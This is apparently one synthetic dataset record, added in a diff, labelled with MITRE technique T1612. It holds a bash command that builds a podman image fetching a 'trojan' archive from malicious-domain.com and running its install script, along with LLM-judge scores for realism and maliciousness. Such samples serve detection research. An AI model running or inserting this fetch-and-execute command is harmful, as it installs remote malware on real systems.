@@ -1,0 +1,59 @@
+{
+  "technique_id": "T1612",
+  "platform": "linux",
+  "shell": "bash",
+  "command": "podman build -t Trojan_image - <<EOF\nFROM alpine\nADD http://malicious-domain.com/trojan.tar.gz /root/\nRUN tar -xzf /root/trojan.tar.gz && /root/trojan/install.sh\nEOF",
+  "explanation": "Builds an image directly from command line input, adding a trojan from a remote link and executing the installation script.",
+  "rationale_steps": [
+    "Inline definition of malicious Dockerfile content, including remote addition of a trojan.",
+    "Automatic execution of a trojan installation script embedded within the image."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1612-d9de570a-74076815",
+  "source_prompt_hash": "d9de570a",
+  "timestamp_utc": "2025-07-10T23:21:09.194530Z",
+  "validation": {
+    "syntax_ok": {
+      "pass": true,
+      "forbidden_tokens": true,
+      "obfuscation_suspicious": false,
+      "obfuscation_entropy": 4.81,
+      "command_length": 165
+    },
+    "llm_judgments": [
+      {
+        "model": "gpt-4-turbo",
+        "score": 0.945,
+        "category_fit": 1.0,
+        "attack_realism": 0.9,
+        "maliciousness": 1.0,
+        "technical_plausibility": 0.9,
+        "privilege_relevance": 0.85,
+        "reason": "The sample precisely matches the technique of building a malicious container image directly on the host, providing a realistic and technically plausible representation of a malicious attack despite not requiring special privileges.",
+        "timestamp": "2025-07-12T18:25:07.298947Z"
+      },
+      {
+        "model": "claude-3-opus-20240229",
+        "category_fit": 1.0,
+        "attack_realism": 0.9,
+        "maliciousness": 0.8,
+        "technical_plausibility": 1.0,
+        "privilege_relevance": 0.9,
+        "score": 0.93,
+        "reason": "Sample perfectly matches T1612's description of building a malicious container image on-host using a legitimate base image (Alpine) with added malware.",
+        "timestamp": "2025-07-14T04:30:38.558558Z"
+      }
+    ],
+    "llm_average_submetrics": {
+      "category_fit": 1.0,
+      "attack_realism": 0.9,
+      "maliciousness": 0.9,
+      "technical_plausibility": 0.95,
+      "privilege_relevance": 0.875
+    },
+    "llm_average_score": 0.938,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
